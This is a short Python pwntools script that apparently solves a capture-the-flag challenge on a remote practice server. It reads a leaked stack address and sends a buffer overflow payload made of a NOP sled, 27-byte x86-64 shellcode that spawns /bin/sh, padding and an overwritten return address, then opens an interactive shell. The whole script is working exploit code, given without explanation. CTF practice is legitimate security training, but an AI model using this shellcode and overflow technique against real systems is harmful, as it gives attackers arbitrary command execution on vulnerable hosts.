#!/usr/bin/env python

from pwn import *

#r = process( './example' )
r = remote( 'ctf.adl.tw', 11000 )
ret_adr = int( r.recvuntil( '\n' ), 16 )
print (hex(ret_adr))

# 27 bytes /bin/sh
payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

attack = '\x90'*10 + payload + 'B'*83 + p64(ret_adr)
r.send(attack)
r.interactive()
